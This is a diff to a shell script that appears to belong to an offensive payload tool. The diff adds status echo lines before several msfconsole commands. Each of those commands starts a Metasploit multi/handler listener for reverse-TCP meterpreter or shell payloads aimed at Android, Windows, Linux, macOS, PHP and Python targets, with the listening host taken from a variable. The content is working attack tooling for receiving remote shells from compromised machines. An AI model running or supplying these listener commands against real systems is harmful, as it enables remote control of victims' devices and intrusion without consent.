@@ -63,6 +63,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload android/meterpreter/reverse_tcp;
            set lhost $ip;
@@ -77,6 +78,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload windows/meterpreter/reverse_tcp;
            set lhost $ip;
@@ -91,6 +93,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload linux/x86/meterpreter/reverse_tcp;
            set lhost $ip;
@@ -105,6 +108,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload osx/x86/shell_reverse_tcp;
            set lhost $ip;
@@ -119,6 +123,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload php/meterpreter/reverse_tcp;
            set lhost $ip;
@@ -133,6 +138,7 @@ if [ $ask_start = 'y' ]; then
         echo 'y/n'
         read start_listener
         if [ $start_listener = 'y' ]; then
+           echo 'starting metasploit...'
            msfconsole -q -x 'use exploit/multi/handler;
            set payload python/meterpreter/reverse_tcp;
            set lhost 127.0.0.1;
